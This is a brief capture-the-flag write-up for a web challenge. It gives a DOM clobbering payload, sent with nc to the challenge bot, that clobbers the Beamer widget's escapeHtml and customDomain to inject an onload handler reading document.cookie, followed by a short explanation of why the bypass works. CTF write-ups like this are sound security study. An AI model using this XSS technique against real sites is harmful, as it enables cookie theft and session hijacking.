# Task

web: http://65.109.209.215:15000/

bot: echo URL | http://65.109.209.215:14000/

Please download the attachment


# Writeup

Payload:
```
echo '<p id="Beamer" name="pushDomain"></p><p id="Beamer"></p><a id="Beamer" name="customDomain" href="http:'"'"'/onload='"'"'console.log(document.cookie)'"'"'/x='"'"'"></a><a id="beamerOverlay"><p id="Beamer" name="escapeHtml"></p></a>' | nc 65.109.209.215 14000
```
Exlpain:
It was about using a (novel?) dom cloberring technique. In short, in non strict mode HTML collections are not configurable. Because of this, if you clobber window.Beamer.escapeHtml, even if it tries to set it, it won't work. Thanks to this you need to find a gadget to remove the escapeHtml cloberring node to make the window.Beamer.escapeHtml function undefined to bypass every HTML encoding calls :)
